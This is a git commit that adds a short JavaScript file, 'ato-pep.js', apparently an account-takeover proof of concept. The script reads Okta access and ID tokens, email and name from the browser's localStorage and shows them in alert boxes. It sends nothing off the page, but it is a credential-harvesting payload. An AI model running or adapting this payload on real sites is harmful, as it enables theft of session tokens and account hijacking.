3ba5b2ab00befe10cd67658b9c343c745e431ce3
itsryuku <39871872+itsryuku@users.noreply.github.com>
2026-01-20 18:24:18 +0100

    ..

---
+++ ato-pep.js
@@ -0,0 +1,32 @@
+const ato = function (){
+  const raw = localStorage.getItem('okta-token-storage');
+
+  if (!raw) {
+    alert('okta-token-storage not found in localStorage');
+    return;
+  }
+
+  let data;
+  try {
+    data = JSON.parse(raw);
+  } catch (e) {
+    alert('Failed to parse okta-token-storage JSON');
+    return;
+  }
+
+  const accessToken = data.accessToken.accessToken;
+  const idToken = data.idToken.idToken;
+  const email = data.idToken.claims.email;
+  const name = data.idToken.claims.name;
+  alert(
+    'User Info:\n' + 
+    'Name: ' + name + '\n' + 
+    'Email: ' + email
+  );
+
+  alert(
+    'accessToken:\n' + accessToken + 
+    '\n\nidToken:\n' + idToken
+  );
+};
+
